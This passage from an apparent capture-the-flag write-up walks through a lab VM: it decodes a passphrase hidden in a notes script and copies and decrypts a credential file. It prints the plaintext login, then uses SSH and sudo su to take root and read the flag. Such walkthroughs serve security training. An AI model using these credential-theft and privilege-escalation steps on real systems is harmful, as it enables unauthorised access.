drwxr-xr-x 2 bob bob 4096 Mar  5 00:50 .
drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 ..
-rwxr-xr-x 1 bob bob  438 Mar  5 00:50 notes.sh
seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ less notes.sh
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
{% endhighlight %}

What's that!? Let's leave this for later and copy previously noticed `login.txt.gpg` file.

{% highlight bash %}
root@kali:~# scp -P 25468 jc@10.0.2.4:/home/bob/Documents/login.txt.gpg ~
  __  __ _ _ _                        _____                          
 |  \/  (_) | |                      / ____|                         
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
                              __/ |                                  
                             |___/                                   


jc@10.0.2.4's password:
login.txt.gpg                                 100%   91    62.0KB/s   00:00
{% endhighlight %}

But of course we're going to need a pasword in order to decrypt the login. That's when I started looking at all my previous notes but none of the guesses worked. And here comes the `notes.sh` and the first letters of each sentence - `HARPOCRATES`. That's the password.  

{% highlight bash %}
root@kali:~# gpg --decrypt login.txt.gpg > login.txt
gpg: keybox '/root/.gnupg/pubring.kbx' created
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
root@kali:~# cat login.txt
bob:b0bcat_
{% endhighlight %}

Now, we can login into Bob's account.

{% highlight bash %}
root@kali:~# ssh bob@10.0.2.4 -p 25468
  __  __ _ _ _                        _____                          
 |  \/  (_) | |                      / ____|                         
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
                              __/ |                                  
                             |___/                                   


bob@10.0.2.4's password:
Linux debian-Lab 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar  5 04:48:32 2018 from 192.168.56.1
bob@debian-Lab:~$
{% endhighlight %}

And of course, as he's admin, we can change our privilages into the root.

{% highlight bash %}
bob@debian-Lab:~$ sudo -l
[sudo] password for bob:
Matching Defaults entries for bob on debian-Lab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on debian-Lab:
    (ALL : ALL) ALL


bob@debian-Lab:~$ sudo su
root@debian-Lab:/home/bob# cat /flag.txt
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
{% endhighlight %}
